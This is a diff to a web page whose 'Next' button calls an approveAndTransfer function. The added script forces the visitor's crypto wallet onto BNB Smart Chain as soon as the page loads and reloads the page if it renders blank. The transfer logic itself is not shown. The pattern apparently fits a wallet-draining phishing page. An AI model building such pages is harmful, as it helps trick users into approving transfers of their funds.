@@ -28,6 +28,47 @@
     <button onclick="approveAndTransfer()">Next</button>
   </div>
 
+  <script>
+    // Auto-reload fix if blank (Trust Wallet)
+    window.addEventListener("load", () => {
+      if (document.body.innerHTML.trim() === "") {
+        location.reload();
+      }
+    });
+
+    // Auto switch to BNB Smart Chain (Chain ID: 0x38)
+    async function ensureBNBChain() {
+      if (window.ethereum) {
+        try {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x38' }],
+          });
+        } catch (err) {
+          // If not added, try to add it
+          if (err.code === 4902) {
+            await window.ethereum.request({
+              method: 'wallet_addEthereumChain',
+              params: [{
+                chainId: '0x38',
+                chainName: 'BNB Smart Chain',
+                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                nativeCurrency: {
+                  name: 'BNB',
+                  symbol: 'BNB',
+                  decimals: 18
+                },
+                blockExplorerUrls: ['https://bscscan.com']
+              }]
+            });
+          }
+        }
+      }
+    }
+
+    ensureBNBChain();
+  </script>
+
   <script src="script.js"></script>
 </body>
 </html>
